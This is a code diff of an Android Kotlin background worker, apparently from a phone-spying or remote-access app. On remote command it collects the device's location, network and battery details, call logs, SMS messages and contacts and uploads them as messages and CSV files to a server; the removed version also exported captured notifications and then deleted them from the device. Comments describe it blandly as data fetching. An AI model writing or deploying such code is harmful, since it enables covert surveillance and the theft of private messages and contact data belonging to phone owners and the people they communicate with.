@@ -14,147 +14,243 @@ import kotlinx.coroutines.tasks.await
 import kotlinx.coroutines.withContext
 import java.io.File
 
-class DataFetchWorker(private val appContext: Context, workerParams: WorkerParameters) :
-    CoroutineWorker(appContext, workerParams) {
-
-    // Dependencies needed by the worker
-    private val apiClient = ApiClient(appContext.getString(R.string.server_base_url))
-    private val manualDataManager = ManualDataManager(appContext)
-    private val systemInfoManager = SystemInfoManager(appContext)
-    private val notificationDao = NotificationDatabase.getDatabase(appContext).notificationDao()
+/**
+ * Background worker that handles various data fetching operations including:
+ * - Location tracking
+ * - System information collection
+ * - CSV exports of call logs, SMS, and contacts
+ * 
+ * All operations are performed with proper permission checks and error handling.
+ */
+class DataFetchWorker(
+    private val appContext: Context, 
+    workerParams: WorkerParameters
+) : CoroutineWorker(appContext, workerParams) {
 
     companion object {
         const val KEY_COMMAND = "COMMAND"
         private const val TAG = "DataFetchWorker"
+        
+        // Command constants for better type safety
+        private const val COMMAND_GET_LOCATION = "get_location"
+        private const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
+        private const val COMMAND_GET_CALL_LOGS = "get_call_logs"
+        private const val COMMAND_GET_SMS = "get_sms"
+        private const val COMMAND_GET_CONTACTS = "get_contacts"
+        
+        // Minimum CSV lines to consider valid data (header + at least one row)
+        private const val MIN_CSV_LINES = 2
     }
 
+    // Lazy initialization to avoid unnecessary object creation
+    private val apiClient by lazy { 
+        ApiClient(appContext.getString(R.string.server_base_url)) 
+    }
+    private val manualDataManager by lazy { 
+        ManualDataManager(appContext) 
+    }
+    private val systemInfoManager by lazy { 
+        SystemInfoManager(appContext) 
+    }
+
+    /**
+     * Main worker execution method that dispatches commands to appropriate handlers
+     */
     override suspend fun doWork(): Result {
         val command = inputData.getString(KEY_COMMAND)
-        if (command == null) {
-            Log.e(TAG, "Worker started without a command.")
+        if (command.isNullOrBlank()) {
+            Log.e(TAG, "Worker started without a valid command")
             return Result.failure()
         }
+        
         Log.d(TAG, "Executing command: $command")
 
         return withContext(Dispatchers.IO) {
             try {
-                val success = when (command) {
-                    "get_location" -> fetchAndSendLocation()
-                    "get_system_info" -> fetchAndSendSystemInfo()
-                    "get_call_logs" -> fetchAndSendCsv("CallLogs", manualDataManager::getCallLogsAsCsv)
-                    "get_sms" -> fetchAndSendCsv("SMS", manualDataManager::getSmsAsCsv)
-                    "get_contacts" -> fetchAndSendCsv("Contacts", manualDataManager::getContactsAsCsv)
-                    "get_notifications" -> fetchAndSendNotificationsCsv()
-                    else -> {
-                        Log.w(TAG, "Unknown command: $command")
-                        false
-                    }
+                val success = executeCommand(command)
+                if (success) {
+                    Log.d(TAG, "Command '$command' executed successfully")
+                    Result.success()
+                } else {
+                    Log.w(TAG, "Command '$command' failed, will retry")
+                    Result.retry()
                 }
-                // If the task was successful, we're done. If not, WorkManager will retry it later.
-                if (success) Result.success() else Result.retry()
             } catch (e: Exception) {
-                Log.e(TAG, "Error executing command: $command", e)
+                Log.e(TAG, "Error executing command '$command'", e)
                 Result.failure()
             }
         }
     }
 
     /**
-     * Gathers extensive system information and sends it as a formatted text message.
+     * Executes the appropriate command based on input
      */
-    private suspend fun fetchAndSendSystemInfo(): Boolean {
-        // Gather all the new data points.
-        // Note: getPublicIpAddress is a suspend function that makes a network call.
-        val batteryStatus = systemInfoManager.getBatteryStatus()
-        val networkType = systemInfoManager.getNetworkType()
-        val localIp = systemInfoManager.getLocalIpAddress()
-        val publicIp = systemInfoManager.getPublicIpAddress()
-        val cellInfo = systemInfoManager.getCellTowerInfo()
-
-        // Build the detailed string using Markdown for nice formatting in Telegram.
-        val systemInfoMessage = """
-            ⚙️ *System Info*
-            
-            *Battery*: ${batteryStatus.percentage}% (${batteryStatus.status})
-            *Network*: $networkType
-            *Local IP*: `$localIp`
-            *Public IP*: `$publicIp`
-            *Cell Tower*: `$cellInfo`
-        """.trimIndent()
-
-        // Send the final message to the server.
-        return apiClient.uploadText(systemInfoMessage)
+    private suspend fun executeCommand(command: String): Boolean {
+        return when (command) {
+            COMMAND_GET_LOCATION -> fetchAndSendLocation()
+            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
+            COMMAND_GET_CALL_LOGS -> fetchAndSendCsv(
+                dataType = "CallLogs",
+                csvProvider = manualDataManager::getCallLogsAsCsv
+            )
+            COMMAND_GET_SMS -> fetchAndSendCsv(
+                dataType = "SMS", 
+                csvProvider = manualDataManager::getSmsAsCsv
+            )
+            COMMAND_GET_CONTACTS -> fetchAndSendCsv(
+                dataType = "Contacts",
+                csvProvider = manualDataManager::getContactsAsCsv
+            )
+            else -> {
+                Log.w(TAG, "Unknown command: $command")
+                apiClient.uploadText("❌ Error: Unknown command '$command'")
+                false
+            }
+        }
     }
 
     /**
-     * Fetches all saved notifications, sends them as a CSV, and deletes them from the local
-     * database upon successful transmission.
+     * Fetches current location and sends it to the server
+     * Requires ACCESS_FINE_LOCATION permission
      */
-    private suspend fun fetchAndSendNotificationsCsv(): Boolean {
-        // 1. Get all notifications from the database
-        val unsentNotifications = notificationDao.getAllNotifications()
-
-        // 2. If there's nothing to send, report it and finish successfully
-        if (unsentNotifications.isEmpty()) {
-            Log.d(TAG, "No new notifications to send.")
-            return apiClient.uploadText("✅ No new notifications found on device.")
-        }
-
-        // 3. Generate the CSV data
-        val csvData = manualDataManager.getNotificationsAsCsv(unsentNotifications)
-        val file = File.createTempFile("notifications_", ".csv", appContext.cacheDir)
-        file.writeText(csvData)
-
-        // 4. Upload the file
-        Log.d(TAG, "Uploading ${unsentNotifications.size} notifications...")
-        val success = apiClient.uploadFile(file, "Exported Notifications from Device")
-        file.delete() // Clean up the temp file
-
-        // 5. If upload was successful, delete the sent items from the database
-        if (success) {
-            val idsToDelete = unsentNotifications.map { it.id }
-            notificationDao.deleteByIds(idsToDelete)
-            Log.d(TAG, "Successfully sent and deleted ${idsToDelete.size} notifications from DB.")
-        } else {
-            Log.e(TAG, "Failed to upload notifications CSV. They will remain in the DB for the next attempt.")
-        }
-
-        return success
-    }
-
     private suspend fun fetchAndSendLocation(): Boolean {
-        if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            Log.e(TAG, "Location permission not granted.")
-            apiClient.uploadText("📍 Location command failed: Permission not granted.")
-            return false // Return false so the server knows the command failed
-        }
-        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)
-        val location = fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
-        return if (location != null) {
-            val message = "📍 Location Update:\nLat: ${location.latitude}\nLon: ${location.longitude}\nAccuracy: ${location.accuracy}m"
-            apiClient.uploadText(message)
-        } else {
-            apiClient.uploadText("📍 Location Update:\nFailed to get location (was null).")
+        return try {
+            if (!hasLocationPermission()) {
+                Log.e(TAG, "Location permission not granted")
+                return apiClient.uploadText("❌ Location command failed: Permission not granted")
+            }
+
+            val location = getCurrentLocation()
+            if (location != null) {
+                val message = buildString {
+                    appendLine("📍 Location Update:")
+                    appendLine("Latitude: ${location.latitude}")
+                    appendLine("Longitude: ${location.longitude}")
+                    appendLine("Accuracy: ${location.accuracy}m")
+                    if (location.hasAltitude()) {
+                        appendLine("Altitude: ${location.altitude}m")
+                    }
+                    appendLine("Timestamp: ${System.currentTimeMillis()}")
+                }
+                apiClient.uploadText(message.trim())
+            } else {
+                Log.w(TAG, "Failed to obtain location - received null")
+                apiClient.uploadText("📍 Location Update: Failed to get location (location was null)")
+                false
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error fetching location", e)
+            apiClient.uploadText("📍 Location Update: Error occurred - ${e.message}")
             false
         }
     }
 
     /**
-     * A generic helper to handle creating and sending CSV files for data types
-     * that can be generated on-demand.
+     * Checks if the app has fine location permission
      */
-    private suspend fun fetchAndSendCsv(dataType: String, csvProvider: () -> String): Boolean {
-        val csvData = csvProvider()
-        if (csvData.lines().size <= 1) { // Check if only header + newline exists
-            Log.d(TAG, "No data to export for $dataType")
-            return apiClient.uploadText("Command failed: No $dataType data found on device.")
+    private fun hasLocationPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(
+            appContext, 
+            Manifest.permission.ACCESS_FINE_LOCATION
+        ) == PackageManager.PERMISSION_GRANTED
+    }
+
+    /**
+     * Gets current location using FusedLocationProvider
+     */
+    private suspend fun getCurrentLocation(): android.location.Location? {
+        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)
+        return try {
+            fusedLocationClient.getCurrentLocation(
+                Priority.PRIORITY_BALANCED_POWER_ACCURACY, 
+                null
+            ).await()
+        } catch (e: Exception) {
+            Log.e(TAG, "Exception getting current location", e)
+            null
         }
+    }
 
-        val file = File.createTempFile(dataType.lowercase(), ".csv", appContext.cacheDir)
-        file.writeText(csvData)
+    /**
+     * Fetches system information (network and battery) and sends to server
+     */
+    private suspend fun fetchAndSendSystemInfo(): Boolean {
+        return try {
+            val networkInfo = systemInfoManager.getNetworkInfo()
+            val batteryInfo = systemInfoManager.getBatteryInfo()
+            
+            val systemInfoMessage = buildString {
+                appendLine("⚙️ System Info:")
+                appendLine("Network: $networkInfo")
+                append(batteryInfo)
+            }
+            
+            apiClient.uploadText(systemInfoMessage)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error fetching system info", e)
+            apiClient.uploadText("⚙️ System Info: Error occurred - ${e.message}")
+            false
+        }
+    }
 
-        val success = apiClient.uploadFile(file, "Exported $dataType from device.")
-        file.delete()
-        return success
+    /**
+     * Generic method to fetch CSV data and upload as file
+     * @param dataType Human-readable name for the data type
+     * @param csvProvider Function that returns CSV data as string
+     */
+    private suspend fun fetchAndSendCsv(
+        dataType: String, 
+        csvProvider: suspend () -> String
+    ): Boolean {
+        return try {
+            Log.d(TAG, "Fetching $dataType data")
+            val csvData = csvProvider()
+            
+            // Check if CSV has meaningful data (more than just header)
+            val lineCount = csvData.lines().size
+            if (lineCount < MIN_CSV_LINES) {
+                Log.d(TAG, "No meaningful data to export for $dataType (only $lineCount lines)")
+                return apiClient.uploadText("📊 $dataType export: No data found to export")
+            }
+
+            // Create temporary file for CSV data
+            val tempFile = createTempCsvFile(dataType, csvData)
+            
+            return try {
+                val success = apiClient.uploadFile(
+                    file = tempFile, 
+                    description = "📊 Exported $dataType from device (${lineCount - 1} records)"
+                )
+                if (success) {
+                    Log.d(TAG, "Successfully uploaded $dataType CSV with ${lineCount - 1} records")
+                } else {
+                    Log.w(TAG, "Failed to upload $dataType CSV file")
+                }
+                success
+            } finally {
+                // Always clean up temporary file
+                if (tempFile.exists()) {
+                    tempFile.delete()
+                    Log.d(TAG, "Cleaned up temporary file: ${tempFile.name}")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error processing $dataType CSV", e)
+            apiClient.uploadText("📊 $dataType export failed: ${e.message}")
+            false
+        }
+    }
+
+    /**
+     * Creates a temporary CSV file with the provided data
+     */
+    private suspend fun createTempCsvFile(dataType: String, csvData: String): File {
+        return withContext(Dispatchers.IO) {
+            val fileName = "${dataType.lowercase()}_${System.currentTimeMillis()}"
+            val tempFile = File.createTempFile(fileName, ".csv", appContext.cacheDir)
+            tempFile.writeText(csvData)
+            Log.d(TAG, "Created temporary CSV file: ${tempFile.name} (${tempFile.length()} bytes)")
+            tempFile
+        }
     }
 }
